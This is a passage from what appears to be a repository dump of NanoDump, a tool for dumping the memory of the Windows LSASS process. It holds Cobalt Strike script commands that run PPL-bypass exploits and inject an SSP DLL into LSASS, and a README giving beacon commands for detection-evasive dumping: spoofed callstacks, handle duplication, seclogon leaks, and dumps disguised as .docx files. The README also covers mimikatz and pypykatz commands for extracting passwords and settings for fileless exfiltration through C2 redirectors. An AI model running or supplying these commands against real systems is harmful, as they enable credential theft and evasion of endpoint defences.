$silent_process_exit, $use_lsass_shtinkering);\n\n    # run\n    btask($1, \"Running NanoDump BOF\");\n    beacon_inline_execute($1, $bof, \"go\", $args);\n}\n\nbeacon_command_register(\n\"nanodump_ppl_dump\",\n\"Bypass PPL and dump LSASS.\",\n\"usage: nanodump_ppl_dump --write C:\\\\Windows\\\\Temp\\\\doc.docx [--valid] [--duplicate] [--help]\\\nDumpfile options:\\\n    --write DUMP_PATH, -w DUMP_PATH\\\n            filename of the dump\\\n    --valid, -v\\\n            create a dump with a valid signature\\\nObtain an LSASS handle via:\\\n    --duplicate, -d\\\n            duplicate an existing LSASS handle\\\nHelp:\\\n    --help, -h\\\n            print this help message and leave\");\nalias nanodump_ppl_dump {\n    local('$barch $handle $bof $exe $args $dump_path $write_file $use_valid_sig $fork $snapshot $dup $i $dll');\n\n    $barch = barch($1);\n    if($barch eq \"x86\")\n    {\n        berror($1, \"Nanodump does not support x86\");\n        return;\n    }\n\n    # reading lsass requires elevated privileges\n    if(!-isadmin $1)\n    {\n        berror($1, \"You need to be admin to run nanodump.\");\n        return;\n    }\n\n    # read in the BOF file\n    $handle = openf(script_resource(\"dist/nanodump_ppl_dump.\" . $barch . \".o\"));\n    $bof = readb($handle, -1);\n    closef($handle);\n    if(strlen($bof) == 0)\n    {\n        berror($1, \"could not read bof file\");\n        return;\n    }\n\n    # read in the DLL file\n    $handle = openf(script_resource(\"dist/nanodump_ppl_dump.\" . $barch . \".dll\"));\n    $dll = readb($handle, -1);\n    closef($handle);\n    if(strlen($dll) == 0)\n    {\n        berror($1, \"could not read dll file\");\n        return;\n    }\n\n    $dump_path = \"\";\n    # by default, download the minidump fileless\n    $write_file = 0;\n    # by default, do not duplicate an LSASS handle\n    $dup = 0;\n    # by default, the signature of the minidump is invalid\n    $use_valid_sig = 0;\n    for ($i = 1; $i < size(@_); $i++)\n    {\n        if (@_[$i] eq \"--write\" || @_[$i] eq \"-w\")\n        {\n            $i++;\n            if($i >= size(@_))\n            {\n                berror($1, \"missing --write value\");\n                return;\n            }\n            # set the path where the minidump will be written to disk\n            $write_file = 1;\n            $dump_path = @_[$i];\n        }\n        else if (@_[$i] eq \"--duplicate\" || @_[$i] eq \"-d\")\n        {\n            # set arg to true for handle duplication\n            $dup = 1;\n        }\n        else if (@_[$i] eq \"--valid\" || @_[$i] eq \"-v\")\n        {\n            # use a valid signature for the minidump\n            $use_valid_sig = 1;\n        }\n        else if (@_[$i] eq \"--help\" || @_[$i] eq \"-h\")\n        {\n            berror($1, beacon_command_detail(\"nanodump_ppl_dump\"));\n            return;\n        }\n        else\n        {\n            berror($1, \"invalid argument: \" . @_[$i]);\n            return;\n        }\n    }\n\n    if ($write_file == 0)\n    {\n        berror($1, \"The --write parameter must be specified\");\n        return;\n    }\n\n    if(!is_full_path($dump_path))\n    {\n        berror($1, \"You need to provide the full path: \". $dump_path);\n        return;\n    }\n\n    # pack the arguments\n    $args = bof_pack($1, \"ziib\", $dump_path, $use_valid_sig, $dup, $dll);\n\n    # run\n    btask($1, \"Running NanoDumpPPLDump BOF\");\n    beacon_inline_execute($1, $bof, \"go\", $args);\n}\n\nbeacon_command_register(\n\"nanodump_ppl_medic\",\n\"Bypass PPL and dump LSASS.\",\n\"usage: nanodump_ppl_medic --write C:\\\\Windows\\\\Temp\\\\doc.docx [--valid] [--elevate-handle] [--help]\\\nDumpfile options:\\\n    --write DUMP_PATH, -w DUMP_PATH\\\n            filename of the dump\\\n    --valid, -v\\\n            create a dump with a valid signature\\\nAvoid opening a handle with high privileges:\\\n    --elevate-handle, -eh\\\n            open a handle to LSASS with low privileges and duplicate it to gain higher privileges\\\nHelp:\\\n    --help, -h\\\n            print this help message and leave\");\nalias nanodump_ppl_medic {\n    local('$barch $handle $bof $exe $args $dump_path $write_file $use_valid_sig $fork $snapshot $elevate_handle $i $dll');\n\n    $barch = barch($1);\n    if($barch eq \"x86\")\n    {\n        berror($1, \"Nanodump does not support x86\");\n        return;\n    }\n\n    # reading lsass requires elevated privileges\n    if(!-isadmin $1)\n    {\n        berror($1, \"You need to be admin to run nanodump.\");\n        return;\n    }\n\n    # read in the BOF file\n    $handle = openf(script_resource(\"dist/nanodump_ppl_medic.\" . $barch . \".o\"));\n    $bof = readb($handle, -1);\n    closef($handle);\n    if(strlen($bof) == 0)\n    {\n        berror($1, \"could not read bof file\");\n        return;\n    }\n\n    # read in the DLL file\n    $handle = openf(script_resource(\"dist/nanodump_ppl_medic.\" . $barch . \".dll\"));\n    $dll = readb($handle, -1);\n    closef($handle);\n    if(strlen($dll) == 0)\n    {\n        berror($1, \"could not read dll file\");\n        return;\n    }\n\n    $dump_path = \"\";\n    # by default, download the minidump fileless\n    $write_file = 0;\n    # by default, do not elevate an LSASS handle\n    $elevate_handle = 0;\n    # by default, the signature of the minidump is invalid\n    $use_valid_sig = 0;\n    for ($i = 1; $i < size(@_); $i++)\n    {\n        if (@_[$i] eq \"--write\" || @_[$i] eq \"-w\")\n        {\n            $i++;\n            if($i >= size(@_))\n            {\n                berror($1, \"missing --write value\");\n                return;\n            }\n            # set the path where the minidump will be written to disk\n            $write_file = 1;\n            $dump_path = @_[$i];\n        }\n        else if (@_[$i] eq \"--elevate-handle\" || @_[$i] eq \"-eh\")\n        {\n            # set arg to true for handle duplication\n            $elevate_handle = 1;\n        }\n        else if (@_[$i] eq \"--valid\" || @_[$i] eq \"-v\")\n        {\n            # use a valid signature for the minidump\n            $use_valid_sig = 1;\n        }\n        else if (@_[$i] eq \"--help\" || @_[$i] eq \"-h\")\n        {\n            berror($1, beacon_command_detail(\"nanodump_ppl_medic\"));\n            return;\n        }\n        else\n        {\n            berror($1, \"invalid argument: \" . @_[$i]);\n            return;\n        }\n    }\n\n    if ($write_file == 0)\n    {\n        berror($1, \"The --write parameter must be specified\");\n        return;\n    }\n\n    if(!is_full_path($dump_path))\n    {\n        berror($1, \"You need to provide the full path: \". $dump_path);\n        return;\n    }\n\n    # pack the arguments\n    $args = bof_pack($1, \"bzii\", $dll, $dump_path, $use_valid_sig, $elevate_handle);\n\n    # run\n    btask($1, \"Running NanoDumpPPLMedic BOF\");\n    beacon_inline_execute($1, $bof, \"go\", $args);\n}\n\nbeacon_command_register(\n\"nanodump_ssp\",\n\"Load a Security Support Provider (SSP) into LSASS.\",\n\"usage: nanodump_ssp --write C:\\\\Windows\\\\Temp\\\\doc.docx [--valid] [--write-dll C:\\\\Windows\\\\Temp\\\\ssp.dll] [--load-dll C:\\\\Windows\\\\Temp\\\\ssp.dll] [--help]\\\nDumpfile options:\\\n    --write DUMP_PATH, -w DUMP_PATH\\\n            filename of the dump\\\n    --valid, -v\\\n            create a dump with a valid signature\\\nSSP DLL options:\\\n    --write-dll, -wdll\\\n            path where to write the SSP DLL from nanodump (randomly generated if not defined)\\\n    --load-dll, -ldll\\\n            load an existing SSP DLL\\\nHelp:\\\n    --help, -h\\\n            print this help message and leave\");\nalias nanodump_ssp {\n    local('$barch $handle $bof $exe $args $write_dll_path $load_dll_path $dll');\n\n    $barch = barch($1);\n    if($barch eq \"x86\")\n    {\n        berror($1, \"Nanodump does not support x86\");\n        return;\n    }\n\n    # loading an SSP requires elevated privileges\n    if(!-isadmin $1)\n    {\n        berror($1, \"You need to be admin to load an SSP.\");\n        return;\n    }\n\n    # read in the BOF file\n    $handle = openf(script_resource(\"dist/nanodump_ssp.\" . $barch . \".o\"));\n    $bof = readb($handle, -1);\n    closef($handle);\n    if(strlen($bof) == 0)\n    {\n        berror($1, \"could not read bof file\");\n        return;\n    }\n\n    $dump_path = \"\";\n    # by default, download the minidump fileless\n    $write_file = 0;\n    # by default, the signature of the minidump is invalid\n    $use_valid_sig = 0;\n    $write_dll_path = \"\";\n    $load_dll_path = \"\";\n    $dll = \"\";\n    for ($i = 1; $i < size(@_); $i++)\n    {\n        if (@_[$i] eq \"--write\" || @_[$i] eq \"-w\")\n        {\n            $i++;\n            if($i >= size(@_))\n            {\n                berror($1, \"missing --write value\");\n                return;\n            }\n            # set the path where the minidump will be written to disk\n            $write_file = 1;\n            $dump_path = @_[$i];\n        }\n        else if (@_[$i] eq \"--valid\" || @_[$i] eq \"-v\")\n        {\n            # use a valid signature for the minidump\n            $use_valid_sig = 1;\n        }\n        else if (@_[$i] eq \"--write-dll\" || @_[$i] eq \"-wdll\")\n        {\n            $i++;\n            if($i >= size(@_))\n            {\n                berror($1, \"missing --write-dll value\");\n                return;\n            }\n            $write_dll_path = @_[$i];\n        }\n        else if (@_[$i] eq \"--load-dll\" || @_[$i] eq \"-ldll\")\n        {\n            $i++;\n            if($i >= size(@_))\n            {\n                berror($1, \"missing --load-dll value\");\n                return;\n            }\n            $load_dll_path = @_[$i];\n        }\n        else if (@_[$i] eq \"--help\" || @_[$i] eq \"-h\")\n        {\n            berror($1, beacon_command_detail(\"nanodump_ppl_medic\"));\n            return;\n        }\n        else\n        {\n            berror($1, \"invalid argument: \" . @_[$i]);\n            return;\n        }\n    }\n\n    if ($write_file == 0)\n    {\n        berror($1, \"The --write parameter must be specified\");\n        return;\n    }\n\n    if(!is_full_path($dump_path))\n    {\n        berror($1, \"You need to provide the full path: \". $dump_path);\n        return;\n    }\n\n    if ($load_dll_path != \"\" && $write_dll_path != \"\")\n    {\n        berror($1, \"The options --write-dll and --load-dll cannot be used together\");\n        return;\n    }\n\n    if ($load_dll_path != \"\" &&!is_full_path($load_dll_path))\n    {\n        berror($1, \"You need to provide the full path: \". $load_dll_path);\n        return;\n    }\n\n    if ($load_dll_path == \"\")\n    {\n        blog($1, \"[!] Writing an unsigned DLL to disk\");\n\n        # read in the DLL file\n        $handle = openf(script_resource(\"dist/nanodump_ssp.\" . $barch . \".dll\"));\n        $dll = readb($handle, -1);\n        closef($handle);\n        if(strlen($dll) == 0)\n        {\n            berror($1, \"could not read dll file\");\n            return;\n        }\n    }\n\n    # pack the arguments\n    $args = bof_pack($1, \"bzzzi\", $dll, $write_dll_path, $load_dll_path, $dump_path, $use_valid_sig);\n\n    # run\n    btask($1, \"Running nanodump_ssp BOF\");\n    beacon_inline_execute($1, $bof, \"go\", $args);\n}\n\nbeacon_command_register(\n\"delete_file\",\n\"Delete a file.\",\n\"Usage: delete_file <file path>\");\nalias delete_file {\n    local('$barch $handle $bof $args');\n\n    $barch = barch($1);\n\n    # make sure the beacon is not WoW64\n    $is64 = binfo($1, \"is64\");\n    if($barch eq \"x86\" && $is64 == 1)\n    {\n        berror($1, \"delete_file does not support WoW64, use: rm\");\n        return;\n    }\n\n    # read in the BOF file\n    $handle = openf(script_resource(\"dist/delete_file.\" . $barch . \".o\"));\n    $bof = readb($handle, -1);\n    closef($handle);\n    if(strlen($bof) == 0)\n    {\n        berror($1, \"could not read bof file\");\n        return;\n    }\n\n    if (size(@_) != 2)\n    {\n        berror($1, beacon_command_detail(\"delete_file\"));\n        return;\n    }\n\n    # pack the arguments\n    $args = bof_pack($1, \"z\", $2);\n\n    # run\n    btask($1, \"Running delete_file BOF\");\n    beacon_inline_execute($1, $bof, \"go\", $args);\n}\n"
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 19.3193359375,
          "content": "# NanoDump\n\nA flexible tool that creates a minidump of the LSASS process.\n\n![screenshot](resources/demo.png)\n\n<h2>Table of contents</h2>\n\n<ol>\n  <li><a href=\"#usage\">Usage</a></li>\n  <li><a href=\"#features\">Features</a></li>\n  <li><a href=\"#combinations\">Combining Techniques</a></li>\n  <li><a href=\"#examples\">Examples</a></li>\n  <li><a href=\"#redirectors\">HTTPS Redirectors</a></li>\n</ol>\n\n<h2 id=\"usage\">1. Usage</h2>\n\n```\nusage: Z:\\nanodump.x64.exe [--write C:\\Windows\\Temp\\doc.docx] [--valid] [--duplicate] [--elevate-handle] [--duplicate-elevate] [--seclogon-leak-local] [--seclogon-leak-remote C:\\Windows\\notepad.exe] [--seclogon-duplicate] [--spoof-callstack] [--silent-process-exit C:\\Windows\\Temp] [--shtinkering] [--fork] [--snapshot] [--getpid] [--help]\nDumpfile options:\n    --write DUMP_PATH, -w DUMP_PATH\n            filename of the dump\n    --valid, -v\n            create a dump with a valid signature\nObtain an LSASS handle via:\n    --duplicate, -d\n            duplicate a high privileged existing LSASS handle\n    --duplicate-elevate, -de\n            duplicate a low privileged existing LSASS handle and then elevate it\n    --seclogon-leak-local, -sll\n            leak an LSASS handle into nanodump via seclogon\n    --seclogon-leak-remote BIN_PATH, -slt BIN_PATH\n            leak an LSASS handle into another process via seclogon and duplicate it\n    --seclogon-duplicate, -sd\n            make seclogon open a handle to LSASS and duplicate it\n    --spoof-callstack, -sc\n            open a handle to LSASS using a fake calling stack\nLet WerFault.exe (instead of nanodump) create the dump\n    --silent-process-exit DUMP_FOLDER, -spe DUMP_FOLDER\n            force WerFault.exe to dump LSASS via SilentProcessExit\n    --shtinkering, -sk\n            force WerFault.exe to dump LSASS via Shtinkering\nAvoid reading LSASS directly:\n    --fork, -f\n            fork the target process before dumping\n    --snapshot, -s\n            snapshot the target process before dumping\nAvoid opening a handle with high privileges:\n    --elevate-handle, -eh\n            open a handle to LSASS with low privileges and duplicate it to gain higher privileges\nMiscellaneous:\n    --getpid\n            print the PID of LSASS and leave\n    --chunk-size\n            chunk size in KiB used to exfiltrate the dump without touching disk (default 900)\nHelp:\n    --help, -h\n            print this help message and leave\n\n```\n\n<h3>Clone</h3>\n\n```bash\ngit clone https://github.com/fortra/nanodump.git\n```\n\n<h3>Compile (optional)</h3>\n\n<b>On Linux with MinGW</b>\n\n```bash\nmake -f Makefile.mingw\n```\n\n<b>On Windows with MSVC</b> (No BOF support)\n\n```bash\nnmake -f Makefile.msvc\n```\n\n<h3>Import (CobaltStrike only)</h3>\n\nImport the `NanoDump.cna` script on Cobalt Strike.\n\n<h3>Run</h3>\n\nRun the `nanodump` command in the Beacon console or the `nanodump.x64.exe` binary.\n\n<h3>Restore the signature</h3>\n\nIf you didn't specify the `--valid` flag, you need to restore the invalid signature\n```zsh\nscripts/restore_signature <dumpfile>\n```\n\n<h3>Get the secretz</h3>\n\n<b>mimikatz:</b>  \nTo get the secrets simply run:\n```sh\nmimikatz.exe \"sekurlsa::minidump <dumpfile>\" \"sekurlsa::logonPasswords full\" exit\n```\n\n<b>pypykatz:</b>  \nIf you prefer to stay on linux, you can use the python3 port of mimikatz called [pypykatz](https://github.com/skelsec/pypykatz):  \n```sh\npython3 -m pypykatz lsa minidump <dumpfie>\n```\n\n<h2 id=\"features\">2. Features</h2>\n\n<h3>Process forking</h2>\n\nTo avoid opening a handle to LSASS with `PROCESS_VM_READ`, you can use the `--fork` parameter.  \nThis will make nanodump create a handle to LSASS with `PROCESS_CREATE_PROCESS` access and then create a 'clone' of the process. This new process will then be dumped. While this will result in a process creation and deletion, it removes the need to read LSASS directly.\n\n<h3>Snapshot</h2>\n\nSimilarly to the `--fork` option, you can use `--snapshot` to create a snapshot of the LSASS process.  \nThis will make nanodump create a handle to LSASS with `PROCESS_CREATE_PROCESS` access and then create a snapshot of the process using `PssNtCaptureSnapshot`. This new process will then be dumped. The snapshot will be freed automatically upon completion.\n\n<h3>Handle duplication</h2>\n\nAs opening a handle to LSASS can be detected, nanodump can instead search for existing handles to LSASS.  \nIf one is found, it will copy it and use it to create the minidump.  \nNote that it is not guaranteed to find such a handle.\n\n<h3>Elevate handle</h2>\n\nYou can obtain a handle to LSASS with PROCESS_QUERY_LIMITED_INFORMATION, which is likely to be whitelisted, and then elevate that handle by duplicating it.\n\n<h3>Seclogon handle leak local</h2>\n\nTo avoid opening a handle to LSASS, you can use abuse the seclogon service by calling `CreateProcessWithLogonW` to leak an LSASS handle into the nanodump binary.  \nTo enable this feature, use the `--seclogon-leak-local` parameter.  \nTake into account that when used from Cobalt Strike, an unsigned nanodump binary needs to be written to disk to use this feature.\n\n<h3>Seclogon handle leak remote</h2>\n\nThis technique is very similar to the previous one, but instead of leaking the handle into nanodump, it is leaked into another binary and then duplicated so that nanodump can used it.\nUse the `--seclogon-leak-remote` flag to access this functionality.\n\n<h3>Seclogon handle duplication</h2>\n\nYou can trick the seclogon process into opening a handle to LSASS and duplicating it before it is closed, by winning a race condition using file locks.\nUse the `--seclogon-duplicate` flag to access this functionality.\n\n<h3>Load nanodump as an SSP</h2>\n\nYou can load nanodump as an SSP in LSASS to avoid opening a handle.  \nWhen the DLL has been loaded into LSASS, the parameters will be passed via a named pipe and once the dump is completed, `DllMain` will return FALSE to make LSASS unload the nanodump DLL.  \nYou can hardcode the parameters into the DLL and avoid using the named pipe altogether with the compiler flag `PASS_PARAMS_VIA_NAMED_PIPES=0`.  \n\n<h4>Upload and load a nanodump DLL</h3>\n\nBy default, an unsigned nanodump DLL will be uploaded to the Temp folder which will be deleted automatically.  \n```\nbeacon> nanodump_ssp -v -w C:\\Windows\\Temp\\lsass.dmp\n```\n\nIf you want to load a pre-existing DLL, you can run:\n```\nbeacon> nanodump_ssp -v -w C:\\Windows\\Temp\\lsass.dmp --load-dll C:\\Windows\\Temp\\ssp.dll\n```\n\n<h3>PPL Dump exploit</h2>\nIf LSASS is running as Protected Process Light (PPL), you can try to bypass it using a userland exploit discovered by Project Zero. If it is successful, the dump will be written to disk.  \n\n> Note that this vulnerability has been fixed in the July 2022 update pack (Windows 10 21H2 Build 19044.1826)\n\nTo access this feature, use the `nanodump_ppl_dump` command\n```\nbeacon> nanodump_ppl_dump -v -w C:\\Windows\\Temp\\lsass.dmp\n```\n\n<h3>PPL Medic exploit</h2>\nNanodump also implements the PPLMedic exploit, which works on systems that have the July 2022 update pack.  \nThe parameters will be passed to the nanodump DLL via a named pipe. You can hardcode the parameters into the DLL and avoid using the named pipe altogether with the compiler flag PASS_PARAMS_VIA_NAMED_PIPES=0.  \n\nTo access this feature, use the `nanodump_ppl_medic` command\n```\nbeacon> nanodump_ppl_medic -v -w C:\\Windows\\Temp\\lsass.dmp\n```\n\n<h3>WerFault</h2>\nYou can force the WerFault.exe process to create a full memory dump of LSASS. Take into consideration that this requires the ability to write to the registry\n\nBecause the dump is not made by nanodump, it will always have a valid signature.\n\n<h4>Silent Process Exit</h3>\n\nTo leverage the Silent Process Exit technique, use the `--silent-process-exit` parameter and the path where the dump should be created.\n```\nbeacon> nanodump --silent-process-exit C:\\Windows\\Temp\\\n```\n\nA dump of the nanodump process will also be created, similar to this:\n```\nPS C:\\> dir 'C:\\Windows\\Temp\\lsass.exe-(PID-648)-4035593\\'\n\nDirectory: C:\\Windows\\Temp\\lsass.exe-(PID-648)-4035593\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n-a----         6/23/2022   7:40 AM       58830409 lsass.exe-(PID-648).dmp\n-a----         6/23/2022   7:40 AM        7862825 nanodump.x64.exe-(PID-3224).dmp\n```\n\n<h4>Shtinkering</h3>\n\nYou can also use the Shtinkering technique, which requires nanodump to run under SYSTEM:\n```\nbeacon> nanodump --shtinkering\n```\n\nThe dump will tipically be created under `C:\\Windows\\system32\\config\\systemprofile\\AppData\\Local\\CrashDumps`\n\n<h3>Spoof the callstack</h2>\n\nYou can open a handle to LSASS with a fake callstack to make the function call look a bit more legitimate (especially if run as BOF).  \nTo access this feature, use the paramter `--spoof-callstack`.  \n\n<h2 id=\"combinations\">3. Combining techniques</h2>\n\nYou can combine many techniques to customize how nanodump operates.  \nThe following table indicates which flags can be used together.\n\n|                        | --write | --valid | --duplicate | --elevate-handle | --duplicate-elevate    | --seclogon-leak-local | --seclogon-leak-remote | --seclogon-duplicate | --spoof-callstack | --silent-process-exit | --shtinkering | --fork | --snapshot | SSP | PPL_DUMP | PPL_MEDIC |\n|------------------------|:-------:|:-------:|:-----------:|:-----------------:|:---------------------:|:---------------------:|:----------------------:|:--------------------:|:-----------------:|:---------------------:|:-------------:|:------:|:----------:|:---:|:--------:|:---------:|\n| --write                | ✓       | ✓       | ✓           | ✓                 | ✓                     | ✓                     | ✓                      | ✓                    | ✓                 |                       |               | ✓      | ✓          |     | ✓        | ✓         |\n| --valid                | ✓       | ✓       | ✓           | ✓                 | ✓                     | ✓                     | ✓                      | ✓                    | ✓                 |                       |               | ✓      | ✓          |     | ✓        | ✓         |\n| --duplicate            | ✓       | ✓       | ✓           |                   |                       |                       |                        |                      |                   |                       | ✓             | ✓      | ✓          |     | ✓        |           |\n| --elevate-handle       | ✓       | ✓       |             | ✓                 |                       |                       |                        |                      | ✓                 |                       | ✓             | ✓      | ✓          |     |          | ✓         |\n| --duplicate-elevate    | ✓       | ✓       |             |                   | ✓                     |                       |                        |                      |                   |                       | ✓             | ✓      | ✓          |     |          |           |\n| --seclogon-leak-local  | ✓       | ✓       |             |                   |                       | ✓                     |                        |                      |                   |                       | ✓             | ✓      | ✓          |     |          |           |\n| --seclogon-leak-remote | ✓       | ✓       |             |                   |                       |                       | ✓                      |                      |                   |                       | ✓             | ✓      | ✓          |     |          |           |\n| --seclogon-duplicate   | ✓       | ✓       |             |                   |                       |                       |                        | ✓                    |                   |                       | ✓             | ✓      | ✓          |     |          |           |\n| --spoof-callstack      | ✓       | ✓       |             | ✓                 |                       |                       |                        |                      | ✓                 |                       | ✓             | ✓      | ✓          |     |          |           |\n| --silent-process-exit  |         |         |             |                   |                       |                       |                        |                      |                   | ✓                     |               |        |            |     |          |           |\n| --shtinkering          |         |         | ✓           | ✓                 | ✓                     | ✓                     | ✓                      | ✓                    | ✓                 |                       | ✓             |        |            |     |          |           |\n| --fork                 | ✓       | ✓       | ✓           | ✓                 | ✓                     | ✓                     | ✓                      | ✓                    | ✓                 |                       |               | ✓      |            |     |          |           |\n| --snapshot             | ✓       | ✓       | ✓           | ✓                 | ✓                     | ✓                     | ✓                      | ✓                    | ✓                 |                       |               |        | ✓          |     |          |           |\n| SSP                    |         |         |             |                   |                       |                       |                        |                      |                   |                       |               |        |            | ✓   |          |           |\n| PPL_DUMP               | ✓       | ✓       | ✓           |                   |                       |                       |                        |                      |                   |                       |               |        |            |     | ✓        |           |\n| PPL_MEDIC              | ✓       | ✓       |             | ✓                 |                       |                       |                        |                      |                   |                       |               |        |            |     |          | ✓         |\n\n<h2 id=\"examples\">4. Examples</h2>\n\nRead LSASS indirectly by creating a fork and write the dump to disk with an invalid signature:\n```\nbeacon> nanodump --fork --write C:\\lsass.dmp\n```\n\nUse the seclogon leak remote to leak an LSASS handle in a notepad process, duplicate that handle to get access to LSASS, then read it indirectly by creating a fork and downloading the dump with a valid signature:\n```\nbeacon> nanodump --seclogon-leak-remote C:\\Windows\\notepad.exe --fork --valid\n```\n\nGet a handle with seclogon leak local, read LSASS indirectly by using a fork and write the dump to disk with a valid signature (a nanodump binary will be uploaded!):\n```\nbeacon> nanodump --seclogon-leak-local --fork --valid --write C:\\Windows\\Temp\\lsass.dmp\n```\n\nDownload the dump with an invalid signature (default):\n```\nbeacon> nanodump\n```\n\nDuplicate an existing handle and write the dump to disk with an invalid signature:\n```\nbeacon> nanodump --duplicate --write C:\\Windows\\Temp\\report.docx\n```\n\nGet the PID of LSASS:\n```\nbeacon> nanodump --getpid\n```\n\nLoad nanodump in LSASS as an SSP (a nanodump binary will be uploaded!):\n```\nbeacon> nanodump_ssp -w C:\\Windows\\Temp\\lsass.dmp\n```\n\nDump LSASS bypassing PPL using the PPLDump exploit, duplicating the handle that csrss.exe has on LSASS:\n```\nbeacon> nanodump_ppl_dump --duplicate --write C:\\Windows\\Temp\\lsass.dmp\n```\n\nDump LSASS bypassing PPL using the PPLMedic exploit, opening a low privileged handle to LSASS and then elevating it:\n```\nbeacon> nanodump_ppl_medic --elevate-handle --write C:\\Windows\\Temp\\lsass.dmp\n```\n\nTrick seclogon into opening a handle to LSASS and duplicate it, then download the dump with an invalid signature:\n```\nbeacon> nanodump --seclogon-duplicate\n```\n\nMake the WerFault.exe process create a full memory dump in the Temp folder:\n```\nbeacon> nanodump --werfault C:\\Windows\\Temp\\\n```\n\nOpen a handle to LSASS with a spoofed callstack and download the minidump with an invalid signature:\n```\nbeacon> nanodump --spoof-callstack\n```\n\nUse the Shtinkering techinque:\n```\nbeacon> nanodump --shtinkering\n```\n\nObtain a handle using seclogon leak local and create the dump using the Shtinkering techinque:\n```\nbeacon> nanodump --seclogon-leak-local --shtinkering\n```\n\nObtain a handle with low privs and elevate it using _elevate handle_:\n```\nbeacon> nanodump --elevate-handle\n```\n\nObtain a handle with low privs using a spoofed callstack and elevate it using _elevate handle_:\n```\nbeacon> nanodump --elevate-handle --spoof-callstack\n```\n\nDuplicate an existing low priv handle and elevate it using _elevate handle_:\n```\nbeacon> nanodump --duplicate-elevate\n```\n\n<h2 id=\"redirectors\">5. HTTPS redirectors</h2>\n\nIf you are using an HTTPS redirector (as you should), you might run into issues when downloading the dump filelessly due to the size of the requests that leak the dump.  \nIncrease the max size of requests on your web server to allow nanodump to download the dump.\n\n#### NGINX\n```\nlocation ~ ^...$ {\n    ...\n    client_max_body_size 50M;\n}\n```\n#### Apache2\n```\n<Directory \"...\">\n    LimitRequestBody  52428800\n</Directory>\n```\n\n## Credits\n- [skelsec](https://twitter.com/skelsec) for writing [minidump](https://github.com/skelsec/minidump), which was crucial for learning the minidump file format.\n- [freefirex](https://twitter.com/freefirex2) from [CS-Situational-Awareness-BOF](https://github.com/trustedsec/CS-Situational-Awareness-BOF) at Trustedsec for many cool tricks for BOFs\n- [Jackson_T](https://twitter.com/Jackson_T) for [SysWhispers2](https://github.com/jthuraisamy/SysWhispers2)\n- [BillDemirkapi](https://twitter.com/BillDemirkapi) for [Process Forking](https://billdemirkapi.me/abusing-windows-implementation-of-fork-for-stealthy-memory-operations/)\n- [Antonio Cocomazzi](https://twitter.com/splinter_code) for [Abusing leaked handles to dump LSASS memory](https://splintercod3.blogspot.com/p/the-hidden-side-of-seclogon-part-2.html) and [Racing for LSASS dumps](https://splintercod3.blogspot.com/p/the-hidden-side-of-seclogon-part-3.html)\n- [xpn](https://twitter.com/_xpn_) for [Exploring Mimikatz - Part 2 - SSP](https://blog.xpnsec.com/exploring-mimikatz-part-2/)\n- [Matteo Malvica](https://twitter.com/matteomalvica) for [Evading WinDefender ATP credential-theft: a hit after a hit-and-miss start](https://www.matteomalvica.com/blog/2019/12/02/win-defender-atp-cred-bypass/)\n- [James Forshaw](https://twitter.com/tiraniddo) for [Windows Exploitation Tricks: Exploiting Arbitrary Object Directory Creation for Local Elevation of Privilege](https://googleprojectzero.blogspot.com/2018/08/windows-exploitation-tricks-exploiting.html)\n- [itm4n](https://twitter.com/itm4n) for the original PPL userland exploits implementation, [PPLDump](https://github.com/itm4n/PPLdump) and [PPLMedic](https://github.com/itm4n/PPLmedic).\n- [Asaf Gilboa](https://mobile.twitter.com/asaf_gilboa) for [Lsass Memory Dumps are Stealthier than Ever Before - Part 2](https://www.deepinstinct.com/blog/lsass-memory-dumps-are-stealthier-than-ever-before-part-2) and the Shtinkering technique\n- [William Burgess](https://twitter.com/joehowwolf) for [Spoofing Call Stacks To Confuse EDRs](https://labs.withsecure.com/blog/spoofing-call-stacks-to-confuse-edrs)\n- [Sebastian Feldmann](https://twitter.com/thefLinkk) and [Fabian](https://twitter.com/testert01) for the _elevate handle_ technique discussed at [Morph Your Malware!](https://www.youtube.com/watch?v=AucQUjJBJuw)\n"
        },
        {
          "name": "dist",
          "type": "tree",
          "content": null
        },
        {
          "name": "include",
          "type": "tree",
          "content": null
        },
        {
          "name": "resources",
          "type": "tree",
          "content": null
        },
        {
          "name": "scripts",
          "type": "tree",
          "content": null
        },
        {
          "name": "source",
          "type": "tree",
          "content": null
        }
      ]
    }
  ]
}